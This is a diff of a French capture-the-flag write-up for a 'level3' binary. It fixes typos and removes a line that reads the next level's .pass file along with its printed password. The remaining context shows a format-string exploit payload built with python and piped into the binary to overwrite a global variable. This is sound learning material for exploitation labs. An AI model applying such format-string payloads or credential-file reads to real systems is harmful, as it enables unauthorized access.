@@ -1,4 +1,4 @@
-On se connecte sur le level0, ou se trouve un **binaire** <code>level3</code>.
+On se connecte sur le level3, ou se trouve un **binaire** <code>level3</code>.
 
 On cherche a savoir ce que fait ce binaire:
 ```gdb
@@ -65,10 +65,6 @@ level3:     file format elf32-i386
 0804988c g     O .bss   00000004              m
 ...</code></pre>
 
-<pre><code>> cd ../level4 && cat .pass
-b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
-</code></pre>
-
 ```gdb
 > python -c 'print "\x8c\x98\x04\x08" + "%4$08n"' > /tmp/payload
 > gdb -q level3
@@ -83,7 +79,7 @@ Breakpoint 1, 0x080484df in v ()
 (gdb) > x/x 0x804988c
 0x804988c <m>:  0x00000004
 ```
-On sait que l'on cherche 64 ($0x40), donc il nous manque 60
+On sait que l'on cherche 64 (0x40), donc il nous manque 60
 
 <pre><code>> (python -c 'print "\x8c\x98\x04\x08" + "%60d" + "%4$08n"'; cat) | ./level3
                                                          512
